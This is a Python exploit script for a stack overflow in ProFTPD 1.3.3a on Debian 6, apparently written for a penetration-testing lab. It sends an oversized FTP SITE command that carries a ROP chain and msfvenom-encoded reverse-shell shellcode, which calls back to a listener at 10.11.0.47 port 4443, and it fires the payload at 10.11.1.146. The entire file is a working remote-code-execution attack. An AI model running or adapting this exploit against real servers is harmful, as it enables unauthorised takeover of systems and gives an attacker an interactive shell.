#!/usr/bin/python
import socket
import struct

# msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.11.0.47 LPORT=4443 -e x86/shikata_ga_nai -b "\x09\x0a\x0b\x0c\x0d\x20\xff" -f c
# Payload size: 95 bytes
shellcode = (
"\xda\xc4\xb8\xd7\x21\x10\x0e\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x12\x31\x42\x17\x03\x42\x17\x83\x15\x25\xf2\xfb\xa8\xfd\x05"
"\xe0\x99\x42\xb9\x8d\x1f\xcc\xdc\xe2\x79\x03\x9e\x90\xdc\x2b"
"\xa0\x5b\x5e\x02\xa6\x9a\x36\x9f\x53\x5d\xe9\xf7\x61\x5d\xe4"
"\x5c\xef\xbc\xb6\x05\xbf\x6f\xe5\x7a\x3c\x19\xe8\xb0\xc3\x4b"
"\x82\x24\xeb\x18\x3a\xd1\xdc\xf1\xd8\x48\xaa\xed\x4e\xd8\x25"
"\x10\xde\xd5\xf8\x53"
)

# Debian 6 - ProFTPD 1.3.3a
ret = struct.pack('<L', 0x805a547) # pop esi / pop ebp / ret
writable = struct.pack('<L', 0x80e81a0) # .data
iaccount = 4096+16
offset = 0x102c-4
buffer = 'SITE ' + shellcode 
oddbyte = "\x41" if (len(buffer) % 2) == 0 else ""
buffer += oddbyte + "\xff"*(iaccount-len(shellcode)) 
padding = "\x41"*(offset-len(buffer))
buffer += padding + ret + writable
buffer += struct.pack('<L', 0xcccccccc) # unused
buffer += struct.pack('<L', 0x805a544) # mov eax,esi / pop ebx / pop esi / pop ebp / ret
buffer += struct.pack('<L', 0xcccccccc) # becomes ebx
buffer += struct.pack('<L', 0xcccccccc) # becomes esi
buffer += struct.pack('<L', 0xcccccccc) # becomes ebp
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x0805c26c) # jmp eax
buffer += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print("Connecting.\n")
	s.connect(('10.11.1.146', 21))
	print("Sending buffer.\n")
	s.send(buffer.encode('utf-8'))
	print("Done.\n")
except:
	print("Failed.\n")
